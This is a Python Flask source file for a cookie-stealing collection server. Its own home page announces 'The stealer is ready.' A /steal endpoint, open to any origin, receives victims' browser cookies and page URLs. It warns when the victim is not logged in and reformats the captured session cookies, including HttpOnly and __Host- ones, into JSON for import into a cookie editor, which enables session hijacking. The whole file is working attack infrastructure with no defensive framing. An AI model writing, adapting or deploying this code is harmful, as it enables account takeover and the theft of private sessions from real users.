from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app) # Enable CORS for all routes

@app.route('/')
def home():
    return "<h1>Server is Up!</h1><p>The stealer is ready.</p>"

@app.route('/steal', methods=['POST'])
def steal():
    # Try to get JSON, fallback to plain text if needed
    data = request.get_json(silent=True) or request.get_data(as_text=True)
    
    # If it's a string (from text/plain), try to parse it if it looks like JSON
    if isinstance(data, str) and data.startswith('{'):
        try:
            import json
            data = json.loads(data)
        except:
            pass

    print("\n--- DATA RECEIVED ---", flush=True)
    if isinstance(data, dict):
        url = data.get('url', 'Unknown')
        cookies = data.get('cookies', [])
        
        if not cookies:
            print(f"URL: {url}", flush=True)
            print("⚠️ WARNING: Received 0 cookies. Make sure you are logged in!", flush=True)
        else:
            print(f"URL: {url}", flush=True)
            print(f"Cookies Captured! (Count: {len(cookies)})", flush=True)
            
            cookie_list = []
            for c in cookies:
                # Cookie Editor format mapping
                cookie = {
                    "name": c.get('name'),
                    "value": c.get('value'),
                    "domain": c.get('domain'),
                    "path": c.get('path', '/'),
                    "secure": c.get('secure', True),
                    "httpOnly": c.get('httpOnly', True),
                    "expirationDate": c.get('expirationDate')
                }
                
                # Handle SameSite mapping
                ss = c.get('sameSite', 'no_restriction')
                if ss == 'unspecified': ss = 'no_restriction'
                cookie["sameSite"] = ss
                
                # CRITICAL: __Host- cookies must NOT have a domain attribute in some import formats
                # or must match the host exactly. To be safe for Cookie Editor import:
                if c.get('name', '').startswith('__Host-'):
                    # For __Host- cookies, we should ensure domain is NOT set with a leading dot
                    if cookie["domain"].startswith('.'):
                        cookie["domain"] = cookie["domain"].lstrip('.')

                cookie_list.append(cookie)
            
            import json
            print("\n--- JSON FOR COOKIE EDITOR IMPORT ---", flush=True)
            print(json.dumps(cookie_list, indent=2), flush=True)
            print("\n--- END OF JSON ---", flush=True)
    else:
        print("Raw Data Received:", data)
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
